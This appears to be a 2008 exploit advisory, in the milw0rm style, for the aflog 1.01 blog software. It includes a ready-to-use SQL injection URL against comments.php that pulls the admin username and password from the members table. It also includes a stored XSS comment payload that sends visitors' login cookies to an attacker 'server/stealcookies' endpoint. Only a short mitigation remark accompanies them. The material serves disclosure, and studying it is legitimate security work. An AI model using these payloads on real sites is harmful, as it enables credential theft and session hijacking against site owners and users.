@@ -1,0 +1,49 @@
+# Name: aflog 1.01 (and possibly earlier)
+# Webiste: http://aflog.org/
+# Vulnerability type: SQL Injection (comments.php) and XSS
+# Author:
+#         shinmai, 2008-01-22
+###############################################################################
+# Description:
+#
+# SQL INJECTION:
+#
+# SQL injection is possible in comments.php for the GET variable 'id', like
+# this:
+http://hostname/aflog/comments.php?id='[SQLI]/*
+# The following POC exposes the username and password of the first registered
+# user (the admin):
+
+http://localhost/aflog/comments.php?id='+UNION+SELECT+666,null,concat('username:',username,',password:',password),1,null,1+FROM+members+ORDER+BY+id+DESC+LIMIT+1/*
+
+#
+# The same principle could be applied to view.php, but forming the SQL
+# injection string is easier in comments.php, IMHO.
+#
+# NOTE:
+# A possible sollution to this is setting magic_quotes_gpc to "on" but this is
+# viable to cause other problems, so a patch to aflog would be more benefitial.
+#
+###############################################################################
+#
+# XSS
+#
+# The comment form doesn't do much parsing on comments posted, other than their
+# length.
+#
+# A newly registered user can easily compose an URL with an XSS exploit and
+# trick a logged in user to click it to steal their login cookie.
+#
+#   Example comment:
+
+Don't go <script>var a="<a
+href='http://server/stealcookies?"+encodeURI(document.cookie)+"'>here</a>";document.write(a);</script>.
+
+#
+# Cliking this link would send the login cookie as a GET request to 'server' to
+# be processed by a script called 'stealcookies'
+#
+# Good luck, and be safe. Greetings to the light of my life, innoscent.
+#
+
+# milw0rm.com [2008-01-22]
